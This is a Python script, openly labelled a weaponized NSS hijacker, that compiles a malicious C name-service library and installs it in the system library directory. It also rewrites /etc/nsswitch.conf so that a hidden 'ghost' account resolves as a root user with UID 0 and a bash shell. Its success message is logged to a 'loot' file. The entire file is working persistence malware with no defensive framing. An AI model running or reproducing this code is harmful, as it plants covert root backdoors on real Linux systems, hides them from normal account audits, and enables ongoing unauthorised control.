import os
import sys
import subprocess

def deploy_nss_ghost(ghost_user="chimera_admin"):
    """
    Weaponized NSS Hijacker: Compiles and installs a custom 
    NSS library to create a persistent, invisible root user.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: NSS library installation requires UID 0.")
        sys.exit(1)

    print(f"[*] Fabricating Ghost Identity: {ghost_user}")

    # C Source for the malicious NSS library
    nss_src = f"""
#include <nss.h>
#include <pwd.h>
#include <string.h>
#include <stdlib.h>

enum nss_status _nss_chimera_getpwnam_r(const char *name, struct passwd *pwd,
                                        char *buffer, size_t buflen, int *errnop) {{
    if (strcmp(name, "{ghost_user}") == 0) {{
        pwd->pw_name = "{ghost_user}";
        pwd->pw_passwd = "x"; // Standard shadow pointer
        pwd->pw_uid = 0;      // ROOT UID
        pwd->pw_gid = 0;      // ROOT GID
        pwd->pw_gecos = "Chimera System Admin";
        pwd->pw_dir = "/root";
        pwd->pw_shell = "/bin/bash";
        return NSS_STATUS_SUCCESS;
    }}
    return NSS_STATUS_NOTFOUND;
}}
"""

    try:
        with open("nss_chimera.c", "w") as f:
            f.write(nss_src)

        # Compile the shared object
        print("[*] Compiling NSS Shared Object...")
        subprocess.run([
            "gcc", "-fPIC", "-shared", "-o", "libnss_chimera.so.2", "nss_chimera.c"
        ], check=True)

        # Install the library to the system path
        lib_path = "/lib/x86_64-linux-gnu/libnss_chimera.so.2"
        subprocess.run(["cp", "libnss_chimera.so.2", lib_path], check=True)
        print(f"[+] Library installed to {lib_path}")

        # Update nsswitch.conf to include our 'chimera' module
        print("[*] Modifying /etc/nsswitch.conf...")
        with open("/etc/nsswitch.conf", "r") as f:
            lines = f.readlines()
        
        with open("/etc/nsswitch.conf", "w") as f:
            for line in lines:
                if line.startswith("passwd:") and "chimera" not in line:
                    f.write(line.replace("files", "files chimera"))
                else:
                    f.write(line)

        print(f"[!!!] SUCCESS: Ghost User '{ghost_user}' is now a system-wide Root.")
        
        # Log to project loot
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: NSS_GHOST_USER | Name: {ghost_user} | UID: 0\n")

    except Exception as e:
        print(f"[-] NSS Hijack Fault: {e}")

if __name__ == "__main__":
    deploy_nss_ghost()
